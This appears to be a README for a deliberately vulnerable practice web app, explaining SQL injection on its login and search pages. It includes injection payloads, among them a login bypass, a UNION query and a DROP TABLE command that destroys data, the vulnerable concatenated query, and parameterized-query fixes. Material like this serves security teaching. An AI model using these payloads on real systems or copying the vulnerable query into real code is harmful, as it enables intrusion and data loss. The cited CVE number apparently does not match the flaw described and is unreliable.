# SQL Injection Vulnerability

## Overview
SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can result in unauthorized access to data, data modification, or administrative operations on the database.

## CVE Reference
CVE-2023-23752

## Vulnerable Endpoints
- Login Form (`/login`)
- User Search (`/vuln/sqlinj`)

## How to Test

### 1. Via Login Form
1. Navigate to `/login`
2. Try these payloads in the username field:
   ```sql
   ' OR '1'='1
   admin' --
   ```
3. Any password will work with these payloads

### 2. Via SQL Injection Demo Page
1. Navigate to `/vuln/sqlinj`
2. Enter `' OR 1=1 --` in the input field
3. Submit the form

## Example Payloads
```sql
' OR '1'='1
admin' --
' UNION SELECT * FROM users --
'; DROP TABLE users --
```

## How It Works
The vulnerability exists because user input is directly concatenated into SQL queries:

```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

## Prevention
1. Use Parameterized Queries:
```javascript
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.query(query, [username, password]);
```

2. Input Validation
3. Use ORMs
4. Principle of Least Privilege for Database Users
